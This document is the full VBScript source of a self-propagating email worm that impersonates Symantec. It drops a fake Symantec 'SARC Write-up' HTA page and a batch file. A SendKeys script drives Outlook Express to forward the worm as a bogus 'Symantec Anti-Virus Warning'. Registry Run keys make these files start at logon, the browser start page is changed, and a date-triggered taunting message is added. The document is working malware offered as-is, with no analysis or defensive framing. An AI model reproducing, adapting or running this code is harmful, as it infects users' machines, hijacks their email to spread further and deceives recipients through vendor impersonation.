On Error Resume Next
Dim hta101, hta102, hta103, send101, send102, send103, bat101, bat102, bat103, msg101, msg102, msg103
hta = "c:\www.symantec.com.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B}"
vbs = "c:\symantec_send.vbs"
bat = "c:\switch.bat"
main = "c:\www.symantec.com.vbs"
Set maincopy = CreateObject("Scripting.FileSystemObject")
maincopy.CopyFile WScript.ScriptFullName, main
 
Set hta101 = CreateObject("Scripting.FileSystemObject")
Set hta102 =hta101.CreateTextFile("c:\www.symantec.com.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B}")
hta102.WriteLine("<HTML><HEAD><TITLE>SARC Write-up - VBS.AmericanHistoryX_II@mm</TITLE><STYLE type=text/css>BODY {MARGIN: 0pt}</STYLE><LINK href=""http://www.symantec.com/avcenter/style/new.sarc.style.css"" rel=styleSheet>" & vbcrlf & "")
hta102.WriteLine("<LINK href=""http://www.symantec.com/avcenter/style/style.css"" rel=styleSheet>" & vbcrlf & "")
hta102.WriteLine("</HEAD><BODY text=#000000 bgColor=#ffffff leftMargin=0" & vbcrlf & "")
hta102.WriteLine("background=""http://www.symantec.com/images/navbar/us.navbar.background.gif"" topMargin=0 marginheight=""0"" marginwidth=""0"">" & vbcrlf & "")
hta102.WriteLine("<TABLE height=""100%"" cellSpacing=0 cellPadding=0 width=769 border=0><TBODY><TR height=12><TD vAlign=top align=left width=9 bgColor=#ffffff height=12><IMG height=11 " & vbcrlf & "")
hta102.WriteLine("src=""http://www.symantec.com/images/navbar/us.navbar.clear.gif"" width=9></TD><TD vAlign=top align=left width=144 bgColor=#ffffff height=12><IMG " & vbcrlf & "")
hta102.WriteLine("height=11 src=""http://www.symantec.com/images/navbar/us.navbar.clear.gif"" width=1></TD><TD vAlign=top align=left width=616 bgColor=#ffffff height=12></TD></TR>" & vbcrlf & "")
hta102.WriteLine("<TR vAlign=top align=left height=234><TD vAlign=top align=left width=9 height=234></TD><TD vAlign=top align=left width=144 height=234>" & vbcrlf & "")
hta102.WriteLine("<TABLE height=""100%"" cellSpacing=0 cellPadding=0 width=144 border=0><TBODY><TR><TD vAlign=top align=left><A href=""http://www.symantec.com/""><IMG " & vbcrlf & "")
hta102.WriteLine("height=85 alt=""Symantec United States"" src=""http://www.symantec.com/images/navbar/us.logo.symantec.gif"" width=144 border=0><BR></A><A " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/globalsites.html""><IMG height=26 alt=""global sites"" src=""http://www.symantec.com/images/navbar/us.navbar.globalsites.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/product/""><IMG height=26 alt=""products"" src=""http://www.symantec.com/images/navbar/us.navbar.products.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/purchase/""><IMG height=26 alt=""purchase"" src=""http://www.symantec.com/images/navbar/us.navbar.purchase.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/techsupp/""><IMG height=26 alt=""service and support"" src=""http://www.symantec.com/images/navbar/us.navbar.support.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/avcenter/""><IMG height=26 alt=""security updates"" src=""http://www.symantec.com/images/navbar/us.navbar.security.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/downloads/""><IMG height=26 alt=""downloads"" src=""http://www.symantec.com/images/navbar/us.navbar.downloads.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/corporate/""><IMG height=26 alt=""about symantec"" src=""http://www.symantec.com/images/navbar/us.navbar.about.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/search/""><IMG height=26 alt=""search"" src=""http://www.symantec.com/images/navbar/us.navbar.search.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><A href=""http://www.symantec.com/feedback/""><IMG height=26 alt=""feedback"" src=""http://www.symantec.com/images/navbar/us.navbar.feedback.gif"" " & vbcrlf & "")
hta102.WriteLine("width=144 border=0></A><BR><IMG height=1 src=""http://www.symantec.com/images/navbar/us.navbar.grey.gif"" width=144><BR><P><FONT face=geneva,arial,helvetica,sans-serif size=1><BR>" & vbcrlf & "")
hta102.WriteLine("�1995-2001 Symantec Corporation.<BR>All rights reserved.<BR><BR><A href=""http://www.symantec.com/legal/legal_note.html"">Legal Notices</A><BR><A href=""http://www.symantec.com/legal/privacy.html"">Privacy " & vbcrlf & "")
hta102.WriteLine("Policy</A><BR></FONT></P></TD></TR></TBODY></TABLE></TD><TD width=616 height=234> <IMG height=63 alt=""security updates"" src=""http://www.symantec.com/images/avcenter/masthead594.gif"" width=594> " & vbcrlf & "")
hta102.WriteLine("<TABLE cellPadding=10 width=616 border=0><TBODY><TR vAlign=top><TD vAlign=top align=left><TABLE height=1078 cellSpacing=0 cellPadding=0 width=596 border=0><TBODY><TR vAlign=top>" & vbcrlf & "")
hta102.WriteLine("<TD vAlign=top align=left width=574><TABLE cellSpacing=0 cellPadding=0 border=0><TBODY><TR height=506><TD vAlign=top width=367 height=506> <A href=""http://www.symantec.com/images/avcenter/virus4.gif""><IMG " & vbcrlf & "")
hta102.WriteLine("height=34 alt=""Level 4"" hspace=3 src=""http://www.symantec.com/images/avcenter/virus4.gif"" width=34 align=right border=0></A><H1>VBS.AmericanHistoryX_II@mm</H1><TABLE><TBODY><TR>" & vbcrlf & "")
hta102.WriteLine("<TD><FONT face=Arial size=2><I>Discovered on: May 01, 2001</I></FONT></TD></TR><TR><TD><FONT face=Arial size=2><I>Last Updated on: May 02, 2001 at 10:09:23 AM PDT</I></FONT></TD>" & vbcrlf & "")
hta102.WriteLine("</TR></TBODY></TABLE><BR><TABLE cellSpacing=0 cellPadding=2 width=""100%"" border=0><TBODY><TR vAlign=top><TD bgColor=#e8e8e8><A href=""c:\www.vbs.americanhistoryx_ii.html""><IMG height=30 alt=""Printer-friendly version"" " & vbcrlf & "")
hta102.WriteLine("src=""http://www.symantec.com/techsupp/images/ver4/buttons/button_kb_printerfriendly.gif"" width=34 align=left border=0><FONT face=Arial size=2>Printer-friendly version</FONT></A></TD></TR></TBODY></TABLE><BR>" & vbcrlf & "")
hta102.WriteLine("<P>This is a Visual BASIC Script worm that spreads by sending itself to all addresses in the Microsoft Outlook address book. The worm arrives with an attachment named AmericanHistoryX_II.vbs. This worm is very similar to " & vbcrlf & "")
hta102.WriteLine("VBS.Protection_Against_Worms. <P><B>NOTE: </B>When you read this, you must warn everybody in your Outlook adress book. They are now also infected with this worm.<BR><P><B><A " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/avcenter/refa.html#aka"">Also Known As:</A></B> VBS.AHX<P><B>Category:</B> <A href=""http://www.symantec.com/avcenter/refa.html#worm"">Worm</A><P><B><A " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/avcenter/refa.html#length"">Infection Length:</A></B> 15 K<P><B><A href=""http://www.symantec.com/avcenter/refa.html#defs"">Virus Definitions:</A></B> May 02, 2001 <P><B><A " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/avcenter/refa.html#assessment"">Threat Assessment:</A></B><P><table border=0 cellpadding=0 cellspacing=0 background=http://www.symantec.com/avcenter/graphics/graph2.gif>" & vbcrlf & "")
hta102.WriteLine("<tr height=100><td align=center valign=bottom width=90><img alt=High src=""http://www.symantec.com/avcenter/graphics/red.gif"" width=15 height=90></td><td align=center valign=bottom width=90>" & vbcrlf & "")
hta102.WriteLine("<img alt=High src=""http://www.symantec.com/avcenter/graphics/red.gif"" width=15 height=90></td><td align=center valign=bottom width=90><img alt=High src=""http://www.symantec.com/avcenter/graphics/red.gif"" width=15 height=90></td>" & vbcrlf & "")
hta102.WriteLine("</tr></table><TABLE cellPadding=0 border=0><TBODY><TR><TD vAlign=top align=middle width=90><A href=""http://www.symantec.com/avcenter/refa.html#Wild"">Wild</A>: <BR>High</TD><TD vAlign=top align=middle width=90><A " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/avcenter/refa.html#Damage"">Damage</A>: <BR>High</TD><TD vAlign=top align=middle width=90><A href=""http://www.symantec.com/avcenter/refa.html#Distribution"">Distribution</A>: <BR>High</TD>" & vbcrlf & "")
hta102.WriteLine("</TR></TBODY></TABLE><IMG src=""http://www.symantec.com/avcenter/graphics/black.gif"" width=380><P><B><A href=""http://www.symantec.com/avcenter/refa.html#Wild"">Wild:</A></B><UL><LI><A href=""http://www.symantec.com/avcenter/refa.html#infect"">Number " & vbcrlf & "")
hta102.WriteLine("of infections:</A> 99 - 999<LI><A href=""http://www.symantec.com/avcenter/refa.html#sites"">Number of sites:</A> 100 - 2000<LI><A href=""http://www.symantec.com/avcenter/refa.html#geo_distribution"">Geographical distribution:</A> High<LI>" & vbcrlf & "")
hta102.WriteLine("<A href=""http://www.symantec.com/avcenter/refa.html#containment"">Threat containment:</A> Difficult<LI><A href=""http://www.symantec.com/avcenter/refa.html#removal"">Removal:</A> Difficult </LI></UL>" & vbcrlf & "")
hta102.WriteLine("<P><B><A href=""http://www.symantec.com/avcenter/refa.html#Damage"">Damage:</A></B><UL><LI><A href=""http://www.symantec.com/avcenter/refa.html#payload"">Payload:</A><UL><LI><A " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/avcenter/refa.html#email"">Large scale e-mailing:</A> Sends itself to all addresses in the Microsoft Outlook address book. <LI><A href=""http://www.symantec.com/avcenter/refa.html#performance"">Degrades " & vbcrlf & "")
hta102.WriteLine("performance:</A> Slows down the system. <LI><A href=""http://www.symantec.com/avcenter/refa.html#unstable"">Causes system instability:</A> Might overload email servers.</LI><LI><b>NOTE:</b> <i>If one of the files made by " & vbcrlf & "")
hta102.WriteLine("the worm, is deleted, a bat file destroys the whole soft- and hardware section of your PC!</i></LI></UL></LI></UL><P><B><A href=""http://www.symantec.com/avcenter/refa.html#Distribution"">Distribution:</A></B>" & vbcrlf & "")
hta102.WriteLine("<UL><LI><A href=""http://www.symantec.com/avcenter/refa.html#subject"">Subject of email:</A> You stupid Fool!!!<LI><A href=""http://www.symantec.com/avcenter/refa.html#name"">Name " & vbcrlf & "")
hta102.WriteLine("of attachment:</A> While U R reading this, U R infected<LI><A href=""http://www.symantec.com/avcenter/refa.html#size"">Size of attachment:</A> 15K</UL><P><P><B><A href=""http://www.symantec.com/avcenter/refa.html#tech"">Technical " & vbcrlf & "")
hta102.WriteLine("description:</A></B> <BR><BR>When executed, VBS.AmericanHistoryX_II@mm does the following: <UL>1. You are already infected with this worm<UL><LI>By now everybody in your adress book has<LI>received a mail from you with this worm.</LI>" & vbcrlf & "")
hta102.WriteLine("</UL><p>2. The worm changes the security level of Internet Explorer<BR>3. It sends itself to all addresses in the Microsoft Outlook address book as:<BR><BR><B>Subject:<BR></B><TT>Hellllllooooooo, YOU ARE ALREADY INFECTED!!! " & vbcrlf & "")
hta102.WriteLine("HAHAHAHAHA </TT><BR><TT><BR></TT><B>Message:</B><TT><BR></TT><TT><br>Hello,<br><br><br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>xxxxxxxxxxxxxxxxxxx </TT><TT><br><br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>" & vbcrlf & "")
hta102.WriteLine("xxxxxx <br><br><br>With regards,<br>X.X. Xxxxxxx<br>HH xx xxxxxxxxx<BR></TT><BR></p></UL><P><P>&nbsp;<BR><P><IMG src=""http://www.symantec.com/avcenter/graphics/black.gif"" width=380> <BR><P><I>Write-up by: The author of the worm</I>" & vbcrlf & "")
hta102.WriteLine("<FORM action=http://www.symantec.com/avcenter/cgi-bin/taf.cgi method=post><INPUT type=image alt=""Tell A Friend"" src=""http://www.symantec.com/sabu/graphics/taf_env.gif"" border=0>&nbsp;<I><FONT face=Arial size=2>Tell a Friend about " & vbcrlf & "")
hta102.WriteLine("this Write-Up</FONT></I></FORM><BR><p></P></TD><TD width=10 height=506>&nbsp;</TD><TD vAlign=top align=left width=197 height=506><TABLE cellSpacing=0 cellPadding=0 width=175 border=0><TBODY><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/avcenter/"">Security Updates</A></TD></TR><TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Symantec AntiVirus Research Center and SWAT</FONT></TD></TR><TR><TD width=5></TD>" & vbcrlf & "")
hta102.WriteLine("<TD width=190><IMG height=5 src=""http://www.symantec.com/images/us.avcenter.clear.gif"" width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink href=""http://www.symantec.com/avcenter/download.html"">Download " & vbcrlf & "")
hta102.WriteLine("Virus Definitions</A></TD></TR><TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Keep your protection up to date</FONT></TD></TR><TR><TD width=5></TD><TD width=190><IMG height=5 " & vbcrlf & "")
hta102.WriteLine("src=""http://www.symantec.com/images/us.avcenter.clear.gif"" width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink href=""http://www.symantec.com/avcenter/vinfodb.html"">Virus Encyclopedia</A></TD></TR>" & vbcrlf & "")
hta102.WriteLine("<TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Search for Information on Viruses, Worms and Trojan Horses</FONT></TD></TR><TR><TD width=5></TD><TD width=190><IMG height=5 " & vbcrlf & "")
hta102.WriteLine("src=""http://www.symantec.com/images/us.avcenter.clear.gif"" width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink href=""http://www.symantec.com/avcenter/hoax.html"">Virus Hoaxes</A></TD></TR><TR>" & vbcrlf & "")
hta102.WriteLine("<TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Information on Virus Hoaxes</FONT></TD></TR><TR><TD width=5></TD><TD width=190><IMG height=5 src=""http://www.symantec.com/images/us.avcenter.clear.gif"" " & vbcrlf & "")
hta102.WriteLine("width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink href=""http://www.symantec.com/avcenter/jokes.html"">Jokes</A></TD></TR><TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif " & vbcrlf & "")
hta102.WriteLine("size=1>Information on Jokes</FONT></TD></TR><TR><TD width=5></TD><TD width=190><IMG height=5 src=""http://www.symantec.com/images/us.avcenter.clear.gif"" width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink " & vbcrlf & "")
hta102.WriteLine("href=""http://www.symantec.com/avcenter/newsletter.html"">Newsletter</A></TD></TR><TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Email Sent from the Symantec AntiVirus Research Center</FONT></TD></TR>" & vbcrlf & "")
hta102.WriteLine("<TR><TD width=5></TD><TD width=190><IMG height=5 src=""http://www.symantec.com/images/us.avcenter.clear.gif"" width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink href=""http://www.symantec.com/avcenter/calendar"">Virus " & vbcrlf & "")
hta102.WriteLine("Calendar</A></TD></TR><TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Monthly Calendar Listing Trigger Dates for Viruses</FONT></TD></TR><TR><TD width=5></TD><TD width=190><IMG height=5 " & vbcrlf & "")
hta102.WriteLine("src=""http://www.symantec.com/images/us.avcenter.clear.gif"" width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink href=""http://www.symantec.com/avcenter/refa.html"">Reference Area</A></TD></TR>" & vbcrlf & "")
hta102.WriteLine("<TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Learn About Virus Detection Technologies</FONT></TD></TR><TR><TD width=5></TD><TD width=190><IMG height=5 src=""http://www.symantec.com/images/us.avcenter.clear.gif"" " & vbcrlf & "")
hta102.WriteLine("width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=190><A class=sidebartitlelink href=""http://www.symantec.com/avcenter/submit.html"">Submit Virus Samples</A></TD></TR><TR><TD width=5></TD><TD width=190><FONT face=geneva,arial,helvetica,sans-serif size=1>Send " & vbcrlf & "")
hta102.WriteLine("Suspected Threats for Review</FONT></TD></TR><TR><TD width=5></TD><TD width=190><IMG height=5 src=""http://www.symantec.com/images/us.avcenter.clear.gif"" width=1 border=0></TD></TR><TR><TD width=5></TD><TD width=185><BR><BR><A href=""http://www.check-mark.com/cgi-bin/redirect.pl"">" & vbcrlf & "")
hta102.WriteLine("<IMG src=""http://a1828.g.akamai.net/7/1828/76/dbb6451e976141/www.symantec.com/avcenter/graphics/checkmark.gif"" border=0></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>" & vbcrlf & "")
hta102.WriteLine("</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><BR>" & vbcrlf & "")
hta102.WriteLine("</BODY></HTML>" & vbcrlf & "")
hta102.WriteBlankLines(2)
hta102.close
Set hta103 = CreateObject("WScript.Shell")
hta103.Run ("c:\www.symantec.com.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B}")
 
Set bat101 = CreateObject("Scripting.FileSystemObject")
Set bat102 = bat101.CreateTextFile("c:\switch.bat", True)
bat102.WriteLine("@echo Symantec Anti-Virus Check-up.")
bat102.WriteLine("@echo off")
bat102.WriteLine("if not exist c:\www.symantec.com.hta goto run")
bat102.WriteLine("goto end")
bat102.WriteLine(" ")
bat102.WriteLine(":run")
bat102.WriteLine("@echo off")
bat102.WriteLine("md c:\switch")
bat102.WriteLine("copy c:\www.symantec.com.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B} c:\switch")
bat102.WriteLine("rename c:\switch\www.symantec.com.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B} www.symantec.com.hta")
bat102.WriteLine("move c:\switch\www.symantec.com.hta c:\")
bat102.WriteLine("exit")
bat102.WriteLine(" ")
bat102.WriteLine(":end")
bat102.WriteLine("exit")
bat102.Close
Set bat103 = CreateObject("WScript.Shell")
bat103.Run ("c:\switch.bat")
 
Set send101 = CreateObject("Scripting.FileSystemObject")
Set send102 = send101.CreateTextFile("c:\www.symantec_send.vbs", True)
send102.WriteLine("On Error Resume Next")
send102.WriteLine("Set FSO = CreateObject(""Scripting.FileSystemObject"")")
send102.WriteLine("Set WshShell = CreateObject(""WScript.Shell"")")
send102.WriteLine("OEDone = WshShell.RegRead(""HKLM\SOFTWARE\Microsoft\WAB\OE Done"")")
send102.WriteLine("If Not OEDone = ""Symantec"" Then")
send102.WriteLine("DI = WshShell.RegRead(""HKCU\Identities\Default User ID"")")
send102.WriteLine("AppData = WshShell.RegRead(""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\AppData"")")
send102.WriteLine("O = AppData&""\Identities\""&DI&""\Microsoft\Outlook Express\Sent Items.dbx""")
send102.WriteLine("N = ""C:\WINDOWS\TEMP\SENT.DLL""")
send102.WriteLine("FSO.CopyFile O,N")
send102.WriteLine("WshShell.Run ""C:\PROGRA~1\OUTLOO~1\MSIMN.EXE""")
send102.WriteLine("WshShell.AppActivate ""Outlook Express""")
send102.WriteLine("W 2000")
send102.WriteLine("K ""%TB""")
send102.WriteLine("W 100")
send102.WriteLine("K ""%EA""")
send102.WriteLine("W 100")
send102.WriteLine("K ""%TIM""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{TAB}{TAB}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""FW: Symantec Anti-Virus Warning""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{TAB}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}----- Original Message -----""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}From: <warning@symantec.com> """)
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}To: <supervisor@av.net>; <security@softtools.com>; <mark_fyston@storess.net>; <directorcut@ufp.com>; """)
send102.WriteLine("W 100")
send102.WriteLine("K ""<pjeterov@goldenhit.org>; <kim_di_yung@freeland.ch>; <james.heart@macrosoft.com> """)
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}Subject: FW: Symantec Anti-Virus Warning""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""Hello,""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}There is a new worm on the Net.""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}This worm is very fast-spreading and very dangerous!""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}Symantec has first noticed it on April 04, 2001.""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}The attached file is a description of the worm and how it replicates itself. """)
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}With regards,""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}F. Jones""")
send102.WriteLine("W 100")
send102.WriteLine("K ""{ENTER}Symantec senior developer""")
send102.WriteLine("W 100")
send102.WriteLine("K ""%IA""")
send102.WriteLine("W 100")
send102.WriteLine("K ""C:\{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""c:\www.symantec.com.vbs{ENTER}""")
send102.WriteLine("W 100")
send102.WriteLine("K ""%FE""")
send102.WriteLine("W 100")
send102.WriteLine("K ""%FX""")
send102.WriteLine("W 100")
send102.WriteLine("WshShell.AppActivate ""Outlook Express""")
send102.WriteLine("K ""%FX""")
send102.WriteLine("WshShell.RegWrite ""HKLM\SOFTWARE\Microsoft\WAB\OE Done"",""Hardhead_SatanikChild""")
send102.WriteLine("FSO.CopyFile N,O")
send102.WriteLine("FSO.DeleteFile N")
send102.WriteLine("End If")
send102.WriteLine("Sub K(str)")
send102.WriteLine("WshShell.SendKeys str")
send102.WriteLine("End Sub")
send102.WriteLine("Sub W(int)")
send102.WriteLine("WScript.Sleep int")
send102.WriteLine("End Sub")
send102.Close
 
Set msg101 = CreateObject("Scripting.FileSystemObject")
Set msg102 = msg101.CreateTextFile("c:\message.vbs", True)
msg102.WriteLine("if month(now) =11 and day(now) =24 then")
msg102.WriteLine("msgbox ""Don't look surprised!""&Chr(13)&""""&Chr(13)&""It is only a warning about your stupidity""&Chr(13)&""Take care!"", vbcritical, ""Some shocking news""")
msg102.WriteLine("end if")
msg102.Close
 
Set register = CreateObject("WScript.Shell")
register.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Outlook", ("c:\www.symantec_send.vbs")
register.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", ("c:\www.symantec.com.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B}")
register.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Symantec", ("c:\infected with Virus.vbs")
register.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Message", ("c:\message.vbs")